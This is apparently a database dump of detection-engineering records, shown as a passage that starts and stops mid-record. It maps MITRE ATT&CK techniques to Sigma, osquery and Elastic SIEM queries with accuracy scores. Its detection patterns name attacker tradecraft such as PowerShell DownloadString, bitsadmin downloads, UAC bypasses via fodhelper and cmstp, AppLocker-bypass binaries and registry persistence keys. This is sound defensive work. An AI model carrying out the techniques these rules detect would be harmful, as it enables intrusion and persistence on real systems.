\\n /* Third party FP's */\\n not process.args : \\"NVDisplay.ContainerLocalSystem\\""}, {"name": "Suspicious ImagePath Service Creation", "query": "registry where registry.path : \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ImagePath\\" and\\n /* add suspicious registry ImagePath values here */\\n registry.data.strings : (\\"%COMSPEC%*\\", \\"*\\\\\\\\.\\\\\\\\pipe\\\\\\\\*\\") or winlog.event_data.Details : (\\"*cmd.exe /q /c*\\", \\"*DownloadString*\\" )"}, {"name": "Service Command Lateral Movement", "query": "sequence by process.entity_id with maxspan = 1m\\n  [process where event.type in (\\"start\\", \\"process_started\\") and\\n     (process.name : \\"sc.exe\\" or process.pe.original_file_name : \\"sc.exe\\") and\\n      process.args : \\"\\\\\\\\\\\\\\\\*\\" and process.args : (\\"binPath=*\\", \\"binpath=*\\") and\\n      process.args : (\\"create\\", \\"config\\", \\"failure\\", \\"start\\")]\\n  [network where process.name : \\"sc.exe\\" and destination.ip != \\"127.0.0.1\\"]\\n"}, {"name": "Persistence via WMI Standard Registry Provider", "query": "registry where \\n registry.data.strings != null and process.name : \\"WmiPrvSe.exe\\" and\\n registry.path : (\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\WOW6432Node\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx\\\\\\\\*\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ServiceDLL\\",\\n                  \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ImagePath\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell\\\\\\\\*\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Environment\\\\\\\\UserInitMprLogonScript\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\\\\\\\\Load\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\System\\\\\\\\Shell\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logoff\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logon\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Shutdown\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Startup\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Ctf\\\\\\\\LangBarAddin\\\\\\\\*\\\\\\\\FilePath\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Exec\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Command Processor\\\\\\\\Autorun\\"\\n                  )\\n"}, {"name": "Network Logon Provider Registry Modification", "query": "registry where registry.data.strings != null and\\n registry.path : \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\NetworkProvider\\\\\\\\ProviderPath\\" and\\n /* Excluding default NetworkProviders RDPNP, LanmanWorkstation and webclient. */\\n not ( user.id : \\"S-1-5-18\\" and\\n       registry.data.strings in\\n                (\\"%SystemRoot%\\\\\\\\System32\\\\\\\\ntlanman.dll\\",\\n                 \\"%SystemRoot%\\\\\\\\System32\\\\\\\\drprov.dll\\",\\n                 \\"%SystemRoot%\\\\\\\\System32\\\\\\\\davclnt.dll\\")\\n      )\\n"}]}}}}}	2021-07-22 08:53:09.104649+00
455	yes		To get the event log in Sysmon we need to update the Sysmon configuration using the configuration available on the site:\nolafhartong/sysmon-modular: A repository of sysmon configuration modules (github.com)\nIt is advised to apply above config after applying SwitOnSecuroty config. Use Sysmon 13 above.	#800080	Process monitoring	{"accuracy_score": 50}	T1055.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_in_memory_assembly_execution.yml", "elastalert": "(((winlog.event_data.CallTrace:\\"*C\\\\:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll\\\\+*\\" AND winlog.event_data.CallTrace:\\"*|C\\\\:\\\\Windows\\\\System32\\\\KERNELBASE.dll\\\\+*\\" AND winlog.event_data.CallTrace:\\"*|UNKNOWN\\\\(*\\" AND winlog.event_data.CallTrace:\\"*\\\\)*\\") OR (winlog.event_data.CallTrace:\\"*UNKNOWN\\\\(*\\" AND winlog.event_data.CallTrace:\\"*\\\\)|UNKNOWN\\\\(*\\" AND winlog.event_data.CallTrace:\\"*\\\\\\"))) OR (winlog.event_data.CallTrace:*UNKNOWN* AND winlog.event_data.GrantedAccess:(\\"0x1F0FFF\\" OR \\"0x1F1FFF\\" OR \\"0x143A\\" OR \\"0x1410\\" OR \\"0x1010\\" OR \\"0x1F2FFF\\" OR \\"0x1F3FFF\\" OR \\"0x1FFFFF\\"))"}], "osquery": [], "elasticsiem": []}}}}}	2021-07-20 07:53:38.95049+00
189	yes	OSQuery,yaml		#008000	Process monitoring	{"accuracy_score": 90}	T1218.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_possible_applocker_bypass.yml", "elastalert": {"name": "possible_applocker_bypass_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "process.command_line:(*\\\\msdt.exe* OR *\\\\installutil.exe* OR *\\\\regsvcs.exe* OR *\\\\regasm.exe* OR *\\\\msbuild.exe* OR *\\\\ieexec.exe*)"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects execution of executables that can be used to bypass Applocker whitelisting"}}, {"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}], "osquery": ["select * from processes where name='hh.exe';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%hh.exe%';", "select script_text from powershell_events where script_text like '%hh.exe%';", "SELECT * FROM processes WHERE LOWER(name)='rundll32.exe';"], "elasticsiem": [{"name": "Network Connection via Compiled HTML File", "query": "sequence by process.entity_id\\n [process where process.name : \\"hh.exe\\" and event.type == \\"start\\"]\\n [network where process.name : \\"hh.exe\\" and\\n not cidrmatch(destination.ip, \\"10.0.0.0/8\\", \\"172.16.0.0/12\\", \\"192.168.0.0/16\\")]\\n"}, {"name": "Process Activity via Compiled HTML File", "query": "process where event.type in (\\"start\\", \\"process_started\\") and \\n process.parent.name : \\"hh.exe\\" and \\n process.name : (\\"mshta.exe\\", \\"cmd.exe\\", \\"powershell.exe\\", \\"pwsh.exe\\", \\"cscript.exe\\", \\"wscript.exe\\")"}]}}}}}	2021-07-20 08:44:14.33519+00
17	yes	OSQuery	All SIDs are considered in this query.	#008000	Windows Registry	{"accuracy_score": 90}	T1548.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": [{"other": [], "sigma": [{"rule": "sysmon_sdclt_child_process.yml", "elastalert": {"name": "sdclt_child_processes_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.parent.executable.keyword:*\\\\sdclt.exe AND winlog.event_id:(\\"4688\\" OR \\"1\\"))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques."}}, {"rule": "win_cmstp_com_object_access.yml", "elastalert": {"name": "cmstp_uac_bypass_via_com_object_access_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.parent.command_line:\\"*\\\\\\\\DllHost.exe\\\\ *\\" AND process.parent.command_line:(\\"*\\\\{3E5FC7F9\\\\-9A51\\\\-4367\\\\-9063\\\\-A120244FBEC7\\\\}\\" OR \\"*\\\\{3E000D72\\\\-A845\\\\-4CD9\\\\-BD83\\\\-80C07C3B881F\\\\}\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects"}}, {"rule": "win_uac_fodhelper_elastalert.yml", "elastalert": {"name": "bypass_uac_via_fodhelper_exe_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.parent.executable.keyword:*\\\\\\\\fodhelper.exe AND winlog.event_id:(\\"4688\\" OR \\"1\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes."}}], "osquery": ["select name, type, data from registry where key='HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command';", "select name, type, data from registry where key='HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open';", "select name, type, data from registry where key LIKE 'HKEY_USERS\\\\%\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open';", "select name, type, data from registry where key LIKE 'HKEY_USERS\\\\%\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\control.exe';", "select name, type, data from registry where key LIKE 'HKEY_USERS\\\\%\\\\Software\\\\Classes\\\\exefile\\\\shell\\\\runas\\\\command\\\\isolatedCommand';", "select name, type, data from registry where key LIKE 'HKEY_USERS\\\\%\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command';"], "elasticsiem": []}]}}}}	2021-07-21 09:36:37.426871+00
32	yes	OSQuery	["1. Need macOS to tryout the attack emulation and osquery detection."]	#FFA500	Process monitoring,Process commandline parameters	"{'accuracy_score': 10}"	T1053.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"macos": {"other": [], "sigma": [], "osquery": ["SELECT name, path, program FROM launchd;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
45	no	other		#FFFFFF	Office  audit logs,Stackdriver logs,Azure activity logs,AWS CloudTrail logs	"{'accuracy_score': 0}"	T1136.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
81	yes	OSQuery		#800080	Windows Registry	"{'accuracy_score': 50}"	T1547.012	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type, data from registry where key='HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Print\\\\Environments\\\\Windows x64\\\\Print Processors';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
121	yes	OSQuery		#008000	Process monitoring,Process commandline parameters,Process monitoring	{"accuracy_score": 90}	T1197	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "rules/windows/process_creation/win_process_creation_bitsadmin_download.yml", "elastalert": {"name": "bitsadmin_download_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:(\\"*\\\\ \\\\/transfer\\\\ *\\") AND process.executable:(\\"*\\\\\\\\bitsadmin.exe\\")) OR process.command_line:(\\"*copy\\\\ bitsadmin.exe*\\"))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects usage of bitsadmin downloading a file"}}, {"rule": "rules/windows/process_creation/win_powershell_bitsjob.yml", "elastalert": {"name": "suspicious_bitsadmin_job_via_powershell_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:\\"*Start-BitsTransfer*\\" AND process.executable:\\"*\\\\powershell.exe\\")"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detect download by BITS jobs via PowerShell"}}], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%bitsadmin%';", "select DISTINCT p.name, p.path, pos.remote_address, pos.remote_port from process_open_sockets pos LEFT JOIN processes p ON pos.pid = p.pid WHERE pos.remote_port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-19 07:28:27.569468+00
30	yes	OSQuery		#800080	Process monitoring	"{'accuracy_score': 50}"	T1204.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='lsass.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='lsass.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent != (SELECT pid from processes where name='csrss.exe') AND LOWER(name)='conhost.exe') OR pid=(SELECT pid FROM processes WHERE parent != (SELECT pid from processes where name='csrss.exe') AND LOWER(name)='conhost.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='powershell.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='powershell.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent != (SELECT pid from processes where name='explorer.exe') AND LOWER(name)='chrome.exe') OR pid=(SELECT pid FROM processes WHERE parent != (SELECT pid from processes where name='explorer.exe') AND LOWER(name)='chrome.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad++.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad++.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='iexplore.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='iexplore.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='services.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='services.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='firefox.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='firefox.exe');"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
42	no	other	MacOS Dependent.	#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1037.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"The /etc/rc.common file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
44	no	other	Not found anything.	#FFFFFF	File monitoring,Asset management	"{'accuracy_score': 0}"	T1525	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
90	no	yaml	In particular look for large quantities of file modification in user directories and under C:\\Windows\\System32\\\n"Partial detection and attack technique as the yaml file availableprovides incomplete information\n\nFalse positives not handled"	#FFFFFF	File monitoring,Process commandline parameters	"{'accuracy_score': 0}"	T1485	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_dd_delete_file.yml", "elastalert": {"name": "overwriting_the_file_with_dev_zero_or_null_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:(*slogchanges* AND *dd*))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects overwriting (effectively wiping/deleting) the file"}}], "osquery": [], "elasticsiem": []}, "windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
94	yes	OSQuery,other	windows is covered but no support for linux and macos yet.	#800080	File monitoring	{"accuracy_score": 70}	T1059.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}, {"rule": "win_malware_script_dropper.yml", "elastalert": {"name": "wscript_or_cscript_dropper_0", "type": "any", "alert": ["debug"], "index": "node:so-*", "filter": [{"query_string": {"query": "((process.command_line:(*C\\\\:\\\\Users\\\\* OR *C\\\\:\\\\ProgramData\\\\*) AND process.executable:(*\\\\wscript.exe OR *\\\\cscript.exe) AND process.command_line:(*.jse* OR *.vbe* OR *.js* OR *.vba* OR *.vbs*)) AND (NOT (process.parent.executable:*\\\\winzip*)))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects wscript/cscript executions of scripts located in user directories"}}], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and (filename like '%cscript%' OR filename like '%wscript%');"], "elasticsiem": [{"name": "Execution of File Written or Modified by Microsoft Office", "query": "sequence with maxspan=2h\\n  [file where event.type != \\"deletion\\" and file.extension : \\"exe\\" and\\n     (process.name : \\"WINWORD.EXE\\" or\\n      process.name : \\"EXCEL.EXE\\" or\\n      process.name : \\"OUTLOOK.EXE\\" or\\n      process.name : \\"POWERPNT.EXE\\" or\\n      process.name : \\"eqnedt32.exe\\" or\\n      process.name : \\"fltldr.exe\\" or\\n      process.name : \\"MSPUB.EXE\\" or\\n      process.name : \\"MSACCESS.EXE\\")\\n  ] by host.id, file.path\\n  [process where event.type in (\\"start\\", \\"process_started\\")] by host.id, process.executable\\n"}, {"name": "Suspicious MS Office Child Process", "query": "process where event.type in (\\"start\\", \\"process_started\\") and\\n  process.parent.name : (\\"eqnedt32.exe\\", \\"excel.exe\\", \\"fltldr.exe\\", \\"msaccess.exe\\", \\"mspub.exe\\", \\"powerpnt.exe\\", \\"winword.exe\\") and\\n  process.name : (\\"Microsoft.Workflow.Compiler.exe\\", \\"arp.exe\\", \\"atbroker.exe\\", \\"bginfo.exe\\", \\"bitsadmin.exe\\", \\"cdb.exe\\", \\"certutil.exe\\",\\n                \\"cmd.exe\\", \\"cmstp.exe\\", \\"cscript.exe\\", \\"csi.exe\\", \\"dnx.exe\\", \\"dsget.exe\\", \\"dsquery.exe\\", \\"forfiles.exe\\", \\"fsi.exe\\",\\n                \\"ftp.exe\\", \\"gpresult.exe\\", \\"hostname.exe\\", \\"ieexec.exe\\", \\"iexpress.exe\\", \\"installutil.exe\\", \\"ipconfig.exe\\", \\"mshta.exe\\",\\n                \\"msxsl.exe\\", \\"nbtstat.exe\\", \\"net.exe\\", \\"net1.exe\\", \\"netsh.exe\\", \\"netstat.exe\\", \\"nltest.exe\\", \\"odbcconf.exe\\", \\"ping.exe\\",\\n                \\"powershell.exe\\", \\"pwsh.exe\\", \\"qprocess.exe\\", \\"quser.exe\\", \\"qwinsta.exe\\", \\"rcsi.exe\\", \\"reg.exe\\", \\"regasm.exe\\", \\"regsvcs.exe\\",\\n                \\"regsvr32.exe\\", \\"sc.exe\\", \\"schtasks.exe\\", \\"systeminfo.exe\\", \\"tasklist.exe\\", \\"tracert.exe\\", \\"whoami.exe\\",\\n                \\"wmic.exe\\", \\"wscript.exe\\", \\"xwizard.exe\\", \\"explorer.exe\\", \\"rundll32.exe\\", \\"hh.exe\\")\\n"}]}}}}}	2021-07-22 13:07:00.240972+00
469	yes	\N		#0000FF	Process monitoring	{"accuracy_score": 80}	T1069.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "reconnaissance_activity_0", "elastalert": {"name": "reconnaissance_activity_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(winlog.channel:\\"Security\\" AND event.code:\\"4616\\" OR winlog.event_data.AccessMask.security:\\"0x2d\\" OR ((winlog.event_data.ObjectType.security:\\"SAM_USER\\" AND winlog.event_data.ObjectName.security:\\"S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-500\\") OR (winlog.event_data.ObjectType.security:\\"SAM_GROUP\\" AND winlog.event_data.ObjectName.security:\\"S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-512\\")))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects activity as \\"net user administrator /domain\\" and \\"net group domain admins /domain\\""}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%net.exe%';"], "elasticsiem": []}]}}}}	2021-07-26 17:46:48.773935+00
105	no	other	Not found anything.	#FFA500	Process monitoring,File monitoring	{"accuracy_score": 5}	T1037.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
104	yes	yaml		#FFA500	Process monitoring	"{'accuracy_score': 20}"	T1574.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_auditd_ld_so_preload_mod.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
60	yes	OSQuery		#800080		"{'accuracy_score': 50}"	T1557.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type, data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\DNSClient';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
126	yes	OSQuery		#008000	Process monitoring	{"accuracy_score": 90}	T1218.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": [{"other": [], "sigma": [{"rule": "win_uac_cmstp.yml", "elastalert": {"name": "bypass_uac_via_cmstp_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:(\\"*/s*\\" OR \\"*/au*\\") AND process.executable:\\"*\\\\cmstp.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe)."}}, {"rule": "win_cmstp_com_object_access.yml", "elastalert": {"name": "cmstp_uac_bypass_via_com_object_access_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.parent.command_line:\\"*\\\\\\\\DllHost.exe\\\\ *\\" AND process.parent.command_line:(\\"*\\\\{3E5FC7F9\\\\-9A51\\\\-4367\\\\-9063\\\\-A120244FBEC7\\\\}\\" OR \\"*\\\\{3E000D72\\\\-A845\\\\-4CD9\\\\-BD83\\\\-80C07C3B881F\\\\}\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects"}}, {"rule": "sysmon_cmstp_execution_by_creation_elastalert.yml", "elastalert": {"name": "cmstp_execution_process_creation_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.parent.executable.keyword:*\\\\\\\\cmstp.exe AND winlog.event_id:(\\"4688\\" OR \\"1\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution"}}, {"rule": 